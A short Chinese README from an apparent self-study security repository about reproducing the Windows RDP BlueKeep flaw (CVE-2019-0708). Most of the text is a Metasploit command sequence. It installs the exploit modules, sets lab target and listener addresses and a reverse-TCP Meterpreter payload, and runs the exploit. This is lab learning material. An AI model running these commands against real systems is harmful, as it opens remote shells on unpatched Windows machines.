# CVE-2019-0708-Windows
这篇文章将分享Windows远程桌面服务漏洞（CVE-2019-0708），并详细讲解该漏洞及防御措施。作者作为网络安全的小白，分享一些自学基础教程给大家，主要是关于安全工具和实践操作的在线笔记，希望您们喜欢。同时，更希望您能与我一起操作和进步，后续将深入学习网络安全和系统安全知识并分享相关实验。总之，希望该系列文章对博友有所帮助，写文不易，大神们不喜勿喷，谢谢！

<br />

对应博客： <br />
[[网络安全自学篇] 五十八.Windows漏洞利用之再看CVE-2019-0708及Metasploit反弹shell](https://blog.csdn.net/Eastmount/article/details/104801332) <br />
[[网络安全自学篇] 四十四.Windows远程桌面服务漏洞（CVE-2019-0708）复现及详解](https://blog.csdn.net/Eastmount/article/details/104134085) <br />

<br />

<B >核心命令：</B><br />
```python
# 复制文件
cp ./rdp/rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/
cp ./rdp/rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/
cp ./rdp/cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/
cp ./rdp/cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/

# 开启工具
msfconsole
reload_all
search 0708

# 使用脚本
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# 查看信息
show options
show targets
info

# 设置监听地址、目标地址、反弹payload、目标类型
set rhosts 192.168.44.132
set lhost 192.168.44.129
set rdp_client_ip 192.168.44.129
set payload windows/x64/meterpreter/reverse_tcp
unset RDP_CLIENT_NAME
set target 3

# 运行脚本
run
exploit

# 设置带宽
Set GROOMSIZE 40
```



参考文献：<br />
[1] [https://github.com/rapid7/metasploit-framework/pull/12283?from=groupmessage&isappinstalled=0](https://github.com/rapid7/metasploit-framework/pull/12283?from=groupmessage&isappinstalled=0) <br />
[2] [https://github.com/n1xbyte/CVE-2019-0708](https://github.com/n1xbyte/CVE-2019-0708) <br />

